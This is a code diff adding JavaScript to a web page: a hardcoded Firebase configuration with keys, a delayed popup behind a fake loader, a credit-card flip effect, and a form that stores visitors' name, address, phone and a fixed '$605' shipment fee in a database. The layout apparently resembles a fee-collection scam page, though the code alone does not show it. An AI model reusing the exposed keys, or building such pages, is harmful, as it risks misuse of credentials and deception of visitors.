@@ -407,6 +407,78 @@
 
 
 <script>
+  // Firebase configuration - replace with your project config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+      authDomain: "scores-b25a7.firebaseapp.com",
+      databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+      projectId: "scores-b25a7",
+      storageBucket: "scores-b25a7.appspot.com",
+      messagingSenderId: "1001957936318",
+      appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+    };
+
+  // Initialize Firebase
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
+
+  function toggleMobileMenu() {
+    document.getElementById('mobileMenu').classList.toggle('open');
+  }
+
+  function showPopup() {
+    const loader = document.getElementById('loaderOverlay');
+    loader.style.display = 'flex';
+
+    setTimeout(() => {
+      loader.style.display = 'none';
+      document.getElementById('popup').style.display = 'block';
+    }, 5000);
+  }
+
+  function closePopup() {
+    document.getElementById('popup').style.display = 'none';
+  }
+
+  function flipCard() {
+    document.getElementById('creditCard').classList.toggle('flipped');
+  }
+
+  // Handle shipment form submit
+  document.addEventListener('DOMContentLoaded', function () {
+    const form = document.getElementById('shipmentForm');
+    if (form) {
+      form.addEventListener('submit', function (e) {
+        e.preventDefault();
+        const name = form.querySelector('input[type="text"]').value;
+        const address = form.querySelector('textarea').value;
+        const phone = form.querySelector('input[type="tel"]').value;
+
+        if (name && address && phone) {
+          const shipmentData = {
+            name,
+            address,
+            phone,
+            fee: "$605",
+            status: "Pending Confirmation",
+            timestamp: new Date().toISOString()
+          };
+
+          db.ref("shipments").push(shipmentData)
+            .then(() => {
+              alert("Shipment request submitted successfully.");
+              form.reset();
+            })
+            .catch(err => {
+              console.error("Error saving to Firebase:", err);
+              alert("There was an error. Please try again.");
+            });
+        } else {
+          alert("Please fill out all fields.");
+        }
+      });
+    }
+  });
   function toggleMobileMenu() {
     document.getElementById('mobileMenu').classList.toggle('open');
   }
